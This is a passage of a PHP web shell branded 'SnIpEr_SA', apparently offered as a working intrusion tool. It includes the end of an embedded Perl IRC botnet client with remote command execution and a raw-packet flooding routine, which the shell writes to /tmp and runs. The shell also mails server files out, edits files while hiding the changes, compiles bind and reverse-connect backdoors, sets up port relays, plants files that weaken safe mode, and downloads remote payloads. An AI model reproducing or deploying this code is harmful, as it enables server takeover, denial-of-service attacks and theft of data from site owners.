  elsif (\$pid = fork) {
     waitpid(\$pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`\$comando 2>&1 3>&1`;
           my \$c=0;
           foreach my \$linha (@resp) {
             \$c++;
             chop \$linha;
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\$linha\");
             if (\$c == \"\$linas_max\") {
               \$c=0;
               sleep \$sleep;
             }
           }
           exit;
       }
  }
}

#eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki
sub attacker {
  my \$iaddr = inet_aton(\$_[0]);
  my \$msg = 'B' x \$_[1];
  my \$ftime = \$_[2];
  my \$cp = 0;
  my (%pacotes);
  \$pacotes{icmp} = \$pacotes{igmp} = \$pacotes{udp} = \$pacotes{o} = \$pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 2) or \$cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or \$cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or \$cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or \$cp++;
  return(undef) if \$cp == 4;
  my \$itime = time;
  my (\$cur_time);
  while ( 1 ) {
     for (my \$porta = 1; \$porta <= 65535; \$porta++) {
       \$cur_time = time - \$itime;
       last if \$cur_time >= \$ftime;
       send(SOCK1, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{igmp}++;
       send(SOCK2, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{udp}++;
       send(SOCK3, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{icmp}++;
       send(SOCK4, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{tcp}++;

       # DoS ?? :P
       for (my \$pc = 3; \$pc <= 255;\$pc++) {
         next if \$pc == 6;
         \$cur_time = time - \$itime;
         last if \$cur_time >= \$ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, \$pc) or next;
         send(SOCK5, \$msg, 0, sockaddr_in(\$porta, \$iaddr)) and \$pacotes{o}++;;
       }
     }
     last if \$cur_time >= \$ftime;
  }
  return(\$cur_time, %pacotes);
}

#############
# ALIASES #
#############

sub action {
   return unless $#_ == 1;
   sendraw(\"PRIVMSG \$_[0] :\\001ACTION \$_[1]\\001\");
}

sub ctcp {
   return unless $#_ == 1;
   sendraw(\"PRIVMSG \$_[0] :\\001\$_[1]\\001\");
}
sub msg {
   return unless $#_ == 1;
   sendraw(\"PRIVMSG \$_[0] :\$_[1]\");
}

sub notice {
   return unless $#_ == 1;
   sendraw(\"NOTICE \$_[0] :\$_[1]\");
}

sub op {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +o \$_[1]\");
}
sub deop {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] -o \$_[1]\");
}
sub hop {
    return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +h \$_[1]\");
}
sub dehop {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +h \$_[1]\");
}
sub voice {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +v \$_[1]\");
}
sub devoice {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] -v \$_[1]\");
}
sub ban {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] +b \$_[1]\");
}
sub unban {
   return unless $#_ == 1;
   sendraw(\"MODE \$_[0] -b \$_[1]\");
}
sub kick {
   return unless $#_ == 1;
   sendraw(\"KICK \$_[0] \$_[1] :\$_[2]\");
}

sub modo {
   return unless $#_ == 0;
   sendraw(\"MODE \$_[0] \$_[1]\");
}
sub mode { modo(@_); }

sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw(\"JOIN \$_[0]\");
}
sub p { part(@_); }
sub part {sendraw(\"PART \$_[0]\");}

sub nick {
  return unless $#_ == 0;
  sendraw(\"NICK \$_[0]\");
}

sub invite {
   return unless $#_ == 1;
   sendraw(\"INVITE \$_[1] \$_[0]\");
}
sub topico {
   return unless $#_ == 1;
   sendraw(\"TOPIC \$_[0] \$_[1]\");
}
sub topic { topico(@_); }

sub whois {
  return unless $#_ == 0;
  sendraw(\"WHOIS \$_[0]\");
}
sub who {
  return unless $#_ == 0;
  sendraw(\"WHO \$_[0]\");
}
sub names {
  return unless $#_ == 0;
  sendraw(\"NAMES \$_[0]\");
}
sub away {
  sendraw(\"AWAY \$_[0]\");
}
sub back { away(); }
sub quit {
  sendraw(\"QUIT :\$_[0]\");
}

# DCC
#########################

package DCC;

sub connections {
   my @ready = \$dcc_sel->can_read(1);
# return unless (@ready);
   foreach my \$fh (@ready) {
     my \$dcctipo = \$DCC{\$fh}{tipo};
     my \$arquivo = \$DCC{\$fh}{arquivo};
     my \$bytes = \$DCC{\$fh}{bytes};
     my \$cur_byte = \$DCC{\$fh}{curbyte};
     my \$nick = \$DCC{\$fh}{nick};


     my \$msg;
     my \$nread = sysread(\$fh, \$msg, 10240);

     if (\$nread == 0 and \$dcctipo =~ /^(get|sendcon)$/) {
        \$DCC{\$fh}{status} = \"Cancelado\";
        \$DCC{\$fh}{ftime} = time;
        \$dcc_sel->remove(\$fh);
        \$fh->close;
        next;
     }

     if (\$dcctipo eq \"get\") {
        \$DCC{\$fh}{curbyte} += length(\$msg);

        my \$cur_byte = \$DCC{\$fh}{curbyte};

        open(FILE, \">> \$arquivo\");
        print FILE \"\$msg\" if (\$cur_byte <= \$bytes);
        close(FILE);

        my \$packbyte = pack(\"N\", \$cur_byte);
        print \$fh \"\$packbyte\";


        if (\$bytes == \$cur_byte) {
           \$dcc_sel->remove(\$fh);
           \$fh->close;
           \$DCC{\$fh}{status} = \"Recebido\";
           \$DCC{\$fh}{ftime} = time;
           next;
        }
     } elsif (\$dcctipo eq \"send\") {
          my \$send = \$fh->accept;
          \$send->autoflush(1);
          \$dcc_sel->add(\$send);
          \$dcc_sel->remove(\$fh);
          \$DCC{\$send}{tipo} = 'sendcon';
          \$DCC{\$send}{itime} = time;
          \$DCC{\$send}{nick} = \$nick;
          \$DCC{\$send}{bytes} = \$bytes;
          \$DCC{\$send}{curbyte} = 0;
          \$DCC{\$send}{arquivo} = \$arquivo;
          \$DCC{\$send}{ip} = \$send->peerhost;
          \$DCC{\$send}{porta} = \$send->peerport;
          \$DCC{\$send}{status} = \"Enviando\";
          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon
          open(FILE, \"< \$arquivo\");
          my \$fbytes;
          read(FILE, \$fbytes, 1024);
          print \$send \"\$fbytes\";
          close FILE;
# delete(\$DCC{\$fh});
} elsif (\$dcctipo eq 'sendcon') {
          my \$bytes_sended = unpack(\"N\", \$msg);
          \$DCC{\$fh}{curbyte} = \$bytes_sended;
          if (\$bytes_sended == \$bytes) {
             \$fh->close;
             \$dcc_sel->remove(\$fh);
             \$DCC{\$fh}{status} = \"Enviado\";
             \$DCC{\$fh}{ftime} = time;
             next;
          }
          open(SENDFILE, \"< \$arquivo\");
          seek(SENDFILE, \$bytes_sended, 0);
          my \$send_bytes;
          read(SENDFILE, \$send_bytes, 1024);
          print \$fh \"\$send_bytes\";
          close(SENDFILE);
     }
   }
}
##########################

sub SEND {
  my (\$nick, \$arquivo) = @_;
  unless (-r \"\$arquivo\") {
    return(0);
  }

  my \$dccark = \$arquivo;
  \$dccark =~ s/[.*\/](\S+)/$1/;

  my \$meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};
  my \$longip = unpack(\"N\",inet_aton(\$meuip));

  my @filestat = stat(\$arquivo);
  my \$size_total=\$filestat[7];
  if (\$size_total == 0) {
     return(0);
  }

  my (\$porta, \$sendsock);
  do {
    \$porta = int rand(64511);
    \$porta += 1024;
    \$sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>\$porta, Proto => 'tcp') and \$dcc_sel->add(\$sendsock);
  } until \$sendsock;

  \$DCC{\$sendsock}{tipo} = 'send';
  \$DCC{\$sendsock}{nick} = \$nick;
  \$DCC{\$sendsock}{bytes} = \$size_total;
  \$DCC{\$sendsock}{arquivo} = \$arquivo;

  &::ctcp(\"\$nick\", \"DCC SEND \$dccark \$longip \$porta \$size_total\");

}

sub GET {
  my (\$arquivo, \$dcclongip, \$dccporta, \$bytes, \$nick) = @_;
  return(0) if (-e \"\$arquivo\");
  if (open(FILE, \"> \$arquivo\")) {
     close FILE;
  } else {
    return(0);
  }

  my \$dccip=fixaddr(\$dcclongip);
  return(0) if (\$dccporta < 1024 or not defined \$dccip or \$bytes < 1);
  my \$dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\$dccip, PeerPort=>\$dccporta, Timeout=>15) or return (0);
  \$dccsock->autoflush(1);
  \$dcc_sel->add(\$dccsock);
  \$DCC{\$dccsock}{tipo} = 'get';
  \$DCC{\$dccsock}{itime} = time;
  \$DCC{\$dccsock}{nick} = \$nick;
  \$DCC{\$dccsock}{bytes} = \$bytes;
  \$DCC{\$dccsock}{curbyte} = 0;
  \$DCC{\$dccsock}{arquivo} = \$arquivo;
  \$DCC{\$dccsock}{ip} = \$dccip;
  \$DCC{\$dccsock}{porta} = \$dccporta;
  \$DCC{\$dccsock}{status} = \"Recebendo\";
}
############################
# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas
sub Status {
  my \$socket = shift;
  my \$sock_tipo = \$DCC{\$socket}{tipo};
  unless (lc(\$sock_tipo) eq \"chat\") {
    my \$nick = \$DCC{\$socket}{nick};
    my \$arquivo = \$DCC{\$socket}{arquivo};
    my \$itime = \$DCC{\$socket}{itime};
    my \$ftime = time;
    my \$status = \$DCC{\$socket}{status};
    \$ftime = \$DCC{\$socket}{ftime} if defined(\$DCC{\$socket}{ftime});

    my \$d_time = \$ftime-\$itime;

    my \$cur_byte = \$DCC{\$socket}{curbyte};
    my \$bytes_total = \$DCC{\$socket}{bytes};

    my \$rate = 0;
    \$rate = (\$cur_byte/1024)/\$d_time if \$cur_byte > 0;
    my \$porcen = (\$cur_byte*100)/\$bytes_total;

    my (\$r_duv, \$p_duv);
    if (\$rate =~ /^(\d+)\.(\d)(\d)(\d)/) {
       \$r_duv = $3; \$r_duv++ if $4 >= 5;
       \$rate = \"$1\.$2\".\"\$r_duv\";
    }
    if (\$porcen =~ /^(\d+)\.(\d)(\d)(\d)/) {
       \$p_duv = $3; \$p_duv++ if $4 >= 5;
       \$porcen = \"$1\.$2\".\"\$p_duv\";
    }
    return(\"\$sock_tipo\",\"\$status\",\"\$nick\",\"\$arquivo\",\"\$bytes_total\", \"\$cur_byte\",\"\$d_time\", \"\$rate\", \"\$porcen\");
  }

  return(0);
}

# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)
sub fixaddr {
    my (\$address) = @_;

    chomp \$address; # just in case, sigh.
    if (\$address =~ /^\d+$/) {
        return inet_ntoa(pack \"N\", \$address);
    } elsif (\$address =~ /^[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}$/) {
        return \$address;
    } elsif (\$address =~ tr/a-zA-Z//) { # Whee! Obfuscation!
        return inet_ntoa(((gethostbyname(\$address))[4])[0]);
    } else {
        return;
    }
}
############################
";
$bot = "/tmp/ircs.pl";
$open = fopen($bot,"w");
fputs($open,$file);
fclose($open);
$cmd="perl $bot";
$cmd2="rm $bot";
system($cmd);
system($cmd2);
$_POST['cmd']="echo \"Now script try connect to ircserver ...\"";

}

if($unix)
 {
 if(!isset($_COOKIE['uname'])) { $uname = ex('uname -a'); setcookie('uname',$uname); } else { $uname = $_COOKIE['uname']; }
 if(!isset($_COOKIE['id'])) { $id = ex('id'); setcookie('id',$id); } else { $id = $_COOKIE['id']; }
 if($safe_mode) { $sysctl = '-'; }
 else if(isset($_COOKIE['sysctl'])) { $sysctl = $_COOKIE['sysctl']; }
 else
  {
   $sysctl = ex('sysctl -n kern.ostype && sysctl -n kern.osrelease');
   if(empty($sysctl)) { $sysctl = ex('sysctl -n kernel.ostype && sysctl -n kernel.osrelease'); }
   if(empty($sysctl)) { $sysctl = '-'; }
   setcookie('sysctl',$sysctl);
  }
 }
echo $head;
echo '</head>';
if(empty($_POST['cmd'])) {
$serv = array(127,192,172,10);
$addr=@explode('.', $_SERVER['SERVER_ADDR']);
$current_version = str_replace('.','',$version);
if (!in_array($addr[0], $serv)) {
@print "<img src=\"http://127.0.0.1/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0>";
@readfile ("http://127.0.0.1/version.php?version=".$current_version."");}}
echo '<body><table width=100% cellpadding=0 cellspacing=0 bgcolor=#CCCCCC><tr><td bgcolor=#000000 width=160><font face=Comic Sans MS size=4>'.ws(2).'<DIV dir=ltr align=center><font face=Wingdings size=3><b>N</b></font><b>'.ws(2).'<DIV dir=ltr align=center><SPAN
style="FILTER: blur(add=1,direction=10,strength=25); HEIGHT: 25px">
<SPAN
style="FONT-SIZE: 15pt; COLOR: white; FONT-FAMILY: Impact">SnIpEr_SA</P></SPAN></DIV></font></b></font></td><td bgcolor=#000000><font face=tahoma size=1>';
echo ws(2)."<b>".date ("d-m-Y H:i:s")."</b>";
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."? title=\"".$lang[$language.'_text46']."\"><b>«·—∆Ì”ÌÂ</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?sqlman title=\"".$lang[$language.'_text46']."\"><b>SQL</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpinfo title=\"".$lang[$language.'_text46']."\"><b>phpinfo</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?phpini title=\"".$lang[$language.'_text47']."\"><b>php.ini</b></a> ".$rb;
if($unix)
 {
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?cpu title=\"".$lang[$language.'_text50']."\"><b>cpu</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?mem title=\"".$lang[$language.'_text51']."\"><b>mem</b></a> ".$rb;
 echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?users title=\"".$lang[$language.'_text95']."\"><b>users</b></a> ".$rb;
 }
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?tmp title=\"".$lang[$language.'_text48']."\"><b>tmp</b></a> ".$rb;
echo ws(2).$lb." <a href=".$_SERVER['PHP_SELF']."?delete title=\"".$lang[$language.'_text49']."\"><b>delete</b></a> ".$rb."<br>";
echo ws(2)."«·Ê÷⁄ «·«„‰: <b>";
echo (($safe_mode)?("<font color=#008000>›⁄«·</font>"):("<font color=red>€Ì— ›⁄«·</font>"));
echo "</b>".ws(2);
echo "«’œ«— «·»Ì « ‘ »Ì: <b>".@phpversion()."</b>";
$curl_on = @function_exists('curl_version');
echo ws(2);
echo "«·ﬂÌ—·: <b>".(($curl_on)?("<font color=#008000>›⁄«·</font>"):("<font color=red>€Ì— ›⁄«·</font>"));
echo "</b>".ws(2);
echo "„«Ì ”ﬂ·: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=#008000>›⁄«·</font>"; } else { echo "<font color=red>€Ì— ›⁄«·</font>"; }
echo "</b>".ws(2);
echo "«„ «” ”ﬂ·: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=#008000>›⁄«·</font>";}else{echo "<font color=red>€Ì— ›⁄«·</font>";}
echo "</b>".ws(2);
echo "»Ê”  ﬁ—Ì ”ﬂ·: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=#008000>›⁄«·</font>";}else{echo "<font color=red>€Ì— ›⁄«·</font>";}
echo "</b>".ws(2);
echo "«Ê—«ﬂ·: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=#008000>›⁄«·</font>";}else{echo "<font color=red>„€·ﬁ</font>";}
echo "</b><br>".ws(2);
echo "«·œÊ«· «·„„‰Ê⁄… : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=#00800F>·«ÌÊÃœ</font></b>";}else{echo "<font color=red>$df</font></b>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
echo "<br>".ws(2)."«·„”«Õ… «·Œ«·ÌÂ : <b>".view_size($free)."</b> «·„”«Õ… «·ﬂ·Ì…: <b>".view_size($all)."</b>";
echo "</b><br>".ws(2);
echo "Register globals: <b>";
$reg_g = @ini_get("register_globals");
if($reg_g){
echo "<font color=#008000>›⁄«·</font>"; } else { echo "<font color=red>€Ì— ›⁄«·</font>"; }
echo "</b>".ws(2);
echo "open_basedir: <b>";
$openbasedi = @ini_get("open_basedir");
if($openbasedi){
echo "<font color=red>›⁄«·</font>"; } else { echo "<font color=#008000>€Ì— ›⁄«·</font>"; }
echo "</b>".ws(2);
echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc>
<tr><td align=right width=100>';
echo $font;
if($unix){
echo '<font color=#990000><b>uname -a :'.ws(1).'<br>sysctl :'.ws(1).'<br>$OSTYPE :'.ws(1).'<br>Server :'.ws(1).'<br>id :'.ws(1).'<br>pwd :'.ws(1).'<br>ip :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=tahoma size=-2 color=#cccccc><b>";
echo((!empty($uname))?(ws(3).@substr($uname,0,120)."<br>"):(ws(3).@substr(@php_uname(),0,120)."<br>"));
echo ws(3).$sysctl."<br>";
echo ws(3).ex('echo $OSTYPE')."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
if(!empty($id)) { echo ws(3).$id."<br>"; }
else if(function_exists('posix_geteuid') && function_exists('posix_getegid') && function_exists('posix_getgrgid') && function_exists('posix_getpwuid'))
 {
 $euserinfo  = @posix_getpwuid(@posix_geteuid());
 $egroupinfo = @posix_getgrgid(@posix_getegid());
 echo ws(3).'uid='.$euserinfo['uid'].' ( '.$euserinfo['name'].' ) gid='.$egroupinfo['gid'].' ( '.$egroupinfo['name'].' )<br>';
 }
else echo ws(3)."user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid()."<br>";
echo ws(3).$dir;
echo ws(3).'( '.perms(@fileperms($dir)).' )';
echo "<br>";
echo ws(3)."<b>Your ip: <a href=http://".$_SERVER["REMOTE_ADDR"].">".$_SERVER["REMOTE_ADDR"]."</a> - Server ip: <a href=http://".gethostbyname($_SERVER["HTTP_HOST"]).">".gethostbyname($_SERVER["HTTP_HOST"])."</a></b><br/>";
echo "</b></font>";
}
else
{
echo '<font color=blue><b>OS :'.ws(1).'<br>Server :'.ws(1).'<br>User :'.ws(1).'<br>pwd :'.ws(1).'<br>ip :'.ws(1).'</b></font><br>';
echo "</td><td>";
echo "<font face=tahoma size=-2 color=red><b>";
echo ws(3).@substr(@php_uname(),0,120)."<br>";
echo ws(3).@substr($SERVER_SOFTWARE,0,120)."<br>";
echo ws(3).@getenv("USERNAME")."<br>";
echo ws(3).$dir;
echo "<br>";
echo ws(3)."<b>Your ip: <a href=http://".$_SERVER["REMOTE_ADDR"].">".$_SERVER["REMOTE_ADDR"]."</a> - Server ip: <a href=http://".gethostbyname($_SERVER["HTTP_HOST"]).">".gethostbyname($_SERVER["HTTP_HOST"])."</a></b><br/>";
echo "<br></font>";
}
echo "</font>";
echo "</td></tr></table>";
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail")
 {
 $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],"From: ".$_POST['from']."\r\n");
 err(6+$res);
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 {
 if(!$file=@fopen($_POST['loc_file'],"r")) { err(1,$_POST['loc_file']); $_POST['cmd']=""; }
 else
  {
    $filename = @basename($_POST['loc_file']);
    $filedump = @fread($file,@filesize($_POST['loc_file']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    $attach = array(
                    "name"=>$filename,
                    "type"=>$mime_type,
                    "content"=>$filedump
                   );
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from SnIpEr_SA shell'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'billy@microsoft.com'; }
    $res = mailattach($_POST['to'],$_POST['from'],$_POST['subj'],$attach);
    err(6+$res);
    $_POST['cmd']="";
  }
 }
if(!empty($_POST['cmd']) && $_POST['cmd'] == "find_text")
{
$_POST['cmd'] = 'find '.$_POST['s_dir'].' -name \''.$_POST['s_mask'].'\' | xargs grep -E \''.$_POST['s_text'].'\'';
}
if(!empty($_POST['cmd']) && $_POST['cmd']=="ch_")
 {
 switch($_POST['what'])
   {
   case 'own':
   @chown($_POST['param1'],$_POST['param2']);
   break;
   case 'grp':
   @chgrp($_POST['param1'],$_POST['param2']);
   break;
   case 'mod':
   @chmod($_POST['param1'],intval($_POST['param2'], 8));
   break;
   }
 $_POST['cmd']="";
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="mk")
 {
   switch($_POST['what'])
   {
     case 'file':
      if($_POST['action'] == "create")
       {
       if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],"w")) { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
       else {
        fclose($file);
        $_POST['e_name'] = $_POST['mk_name'];
        $_POST['cmd']="edit_file";
        echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2><b>".$lang[$language.'_text61']."</b></font></div></td></tr></table>";
        }
       }
       else if($_POST['action'] == "delete")
       {
       if(unlink($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2><b>".$lang[$language.'_text63']."</b></font></div></td></tr></table>";
       $_POST['cmd']="";
       }
     break;
     case 'dir':
      if($_POST['action'] == "create"){
      if(mkdir($_POST['mk_name']))
       {
         $_POST['cmd']="";
         echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2><b>".$lang[$language.'_text62']."</b></font></div></td></tr></table>";
       }
      else { err(2,$_POST['mk_name']); $_POST['cmd']=""; }
      }
      else if($_POST['action'] == "delete"){
      if(rmdir($_POST['mk_name'])) echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2><b>".$lang[$language.'_text64']."</b></font></div></td></tr></table>";
      $_POST['cmd']="";
      }
     break;
   }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="edit_file" && !empty($_POST['e_name']))
 {
 if(!$file=@fopen($_POST['e_name'],"r+")) { $only_read = 1; @fclose($file); }
 if(!$file=@fopen($_POST['e_name'],"r")) { err(1,$_POST['e_name']); $_POST['cmd']=""; }
 else {
 echo $table_up3;
 echo $font;
 echo "<form name=save_file method=post>";
 echo ws(3)."<b>".$_POST['e_name']."</b>";
 echo "<div align=center><textarea name=e_text cols=121 rows=24>";
 echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));
 fclose($file);
 echo "</textarea>";
 echo "<input type=hidden name=e_name value=".$_POST['e_name'].">";
 echo "<input type=hidden name=dir value=".$dir.">";
 echo "<input type=hidden name=cmd value=save_file>";
 echo (!empty($only_read)?("<br><br>".$lang[$language.'_text44']):("<br><br><input type=submit name=submit value=\" ".$lang[$language.'_butt10']." \">"));
 echo "</div>";
 echo "</font>";
 echo "</form>";
 echo "</td></tr></table>";
 exit();
 }
 }
if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
 {
 $mtime = @filemtime($_POST['e_name']);
 if(!$file=@fopen($_POST['e_name'],"w")) { err(0,$_POST['e_name']); }
 else {
 if($unix) $_POST['e_text']=@str_replace("\r\n","\n",$_POST['e_text']);
 @fwrite($file,$_POST['e_text']);
 @touch($_POST['e_name'],$mtime,$mtime);
 $_POST['cmd']="";
 echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2><b>".$lang[$language.'_text45']."</b></font></div></td></tr></table>";
 }
 }



if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 cf("/tmp/bd.c",$port_bind_bd_c);
 $blah = ex("gcc -o /tmp/bd /tmp/bd.c");
 @unlink("/tmp/bd.c");
 $blah = ex("/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &");
 $_POST['cmd']="ps -aux | grep bd";
$_POST['cmd']="echo \"Now try connect to nc -vv ".gethostbyname($_SERVER["HTTP_HOST"])." port ".$_POST['port']." ...\"";

}
if (!empty($_POST['port1']))
{
 cf("bds",$port_bind_bd_cs);
 $blah = ex("chmod 777 bds");
 $blah = ex("./bds ".$_POST['port1']." &");
 $_POST['cmd']="echo \"Now script install backdoor connect to port ";
  }else{
cf("/tmp/bds",$port_bind_bd_cs);
 $blah = ex("chmod 777 bds");
 $blah = ex("./tmp/bds ".$_POST['port1']." &");
 }
if (!empty($_POST['php_ini1']))
{
 cf("php.ini",$php_ini1);
  $_POST['cmd']=" ·«Ìﬁ«› «·”Ì› „Êœ php.ini  „ “—⁄ „·›";
 }

 if (!empty($_POST['htacces']))
{
 cf(".htaccess",$htacces);
  $_POST['cmd']="·≈Ìﬁ«› «·„Êœ ”ﬂÌÊ— Ì htaccess  „ “—⁄ „·›";
 }
  if (!empty($_POST['file_ini']))
{
 cf("ini.php",$sni_res);

  $_POST['cmd']=" http://target.com/ini.php?ss=http://shell.txt? ﬂ«· «·Ì ss »«·„ €Ì— ini.php «·√‰ ﬁ„ »⁄„· «‰ﬂ·Êœ ·„·›";
 }

if(($_POST['fileto'] != "")||($_POST['filefrom'] != ""))

{
$data = implode("", file($_POST['filefrom']));
$fp = fopen($_POST['fileto'], "wb");
fputs($fp, $data);
$ok = fclose($fp);
if($ok)
{
$size = filesize($_POST['fileto'])/1024;
$sizef = sprintf("%.2f", $size);
print "<center><div id=logostrip>Download - OK.
(".$sizef."Í?)</div></center>";
}
else
{
print "<center><div id=logostrip>Something is wrong. Download - IS NOT
OK</div></center>";
}
}
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 cf("/tmp/bdpl",$port_bind_bd_pl);
 $p2=which("perl");
 $blah = ex($p2." /tmp/bdpl ".$_POST['port']." &");
 $_POST['cmd']="ps -aux | grep bdpl";
 $_POST['cmd']="echo \"Now try connect to nc -vv ".gethostbyname($_SERVER["HTTP_HOST"])." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." /tmp/back ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...Datached\"";
}
if (!empty($_POST['ips']) && !empty($_POST['ports']))
{
 cf("/tmp/backs",$back_connects);
 $p2=which("perl");
 $blah = ex($p2." /tmp/backs ".$_POST['ips']." ".$_POST['ports']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ips']." port ".$_POST['ports']." ...\"";

}
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 cf("/tmp/back.c",$back_connect_c);
 $blah = ex("gcc -o /tmp/backc /tmp/back.c");
 @unlink("/tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['ip']." ".$_POST['port']." &");
 $_POST['cmd']="echo \"Now script try connect to ".$_POST['ip']." port ".$_POST['port']." ...\"";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="Perl"))
{
 cf("/tmp/dp",$datapipe_pl);
 $p2=which("perl");
 $blah = ex($p2." /tmp/dp ".$_POST['local_port']." ".$_POST['remote_host']." ".$_POST['remote_port']." &");
 $_POST['cmd']="ps -aux | grep dp";
}
if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && ($_POST['use']=="C"))
{
 cf("/tmp/dpc.c",$datapipe_c);
 $blah = ex("gcc -o /tmp/dpc /tmp/dpc.c");
 @unlink("/tmp/dpc.c");
 $blah = ex("/tmp/dpc ".$_POST['local_port']." ".$_POST['remote_port']." ".$_POST['remote_host']." &");
 $_POST['cmd']="ps -aux | grep dpc";
}
if (!empty($_POST['alias']) && isset($aliases[$_POST['alias']])) { $_POST['cmd'] = $aliases[$_POST['alias']]; }
if (!empty($HTTP_POST_FILES['userfile']['name']))
{
if(!empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }
else { $nfn = $HTTP_POST_FILES['userfile']['name']; }
@copy($HTTP_POST_FILES['userfile']['tmp_name'],
            $_POST['dir']."/".$nfn)
      or print("<font color=red face=Fixedsys><div align=center>Error uploading file ".$HTTP_POST_FILES['userfile']['name']."</div></font>");
}
if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file']))
{
 switch($_POST['with'])
 {
 case wget:
 $_POST['cmd'] = which('wget')." ".$_POST['rem_file']." -O ".$_POST['loc_file']."";
 break;
 case fetch:
 $_POST['cmd'] = which('fetch')." -o ".$_POST['loc_file']." -p ".$_POST['rem_file']."";
 break;
 case lynx:
 $_POST['cmd'] = which('lynx')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case links:
 $_POST['cmd'] = which('links')." -source ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case GET:
